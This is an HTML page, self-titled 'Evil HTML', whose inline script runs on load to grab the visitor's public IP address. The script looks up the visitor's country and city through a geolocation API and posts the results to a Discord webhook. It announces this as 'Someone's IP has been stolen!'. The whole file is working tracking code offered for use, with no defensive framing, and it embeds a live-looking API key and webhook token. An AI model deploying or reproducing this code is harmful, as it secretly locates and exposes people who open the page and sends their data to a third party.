<!DOCTYPE html>
<html>
<head>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    window.onload = function() {
      $.getJSON("https://api.ipify.org?format=json", function(data) {
        var ip = data.ip;

        $.getJSON("https://api.ipgeolocation.io/ipgeo?apiKey=ef04e2b77ed84e1d8045fd309aa96fd9&ip=" + ip, function(data) {
          var country = data.country_name;
          var city = data.city;

          $.ajax({
            url: "https://discord.com/api/webhooks/1207525420090785823/c_nDPu4IzVaxPS5a1xJelOx_obJffzuJTeITst_1OafMaxC9P2VjkwRRexdB1NIHZtgZ",
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify({
              "embeds": [{
                "title": "IP Information",
                "description": "Someone's IP has been stolen!",
                "color": 16711680,
                "fields": [
                  {
                    "name": "IP",
                    "value": ip,
                    "inline": true
                  },
                  {
                    "name": "Country",
                    "value": country,
                    "inline": true
                  },
                  {
                    "name": "City",
                    "value": city,
                    "inline": true
                  }
                ]
              }]
            })
          });
        });
      });
    };
  </script>
</head>
<body>
  <h1>Evil HTML</h1>
</body>
</html>
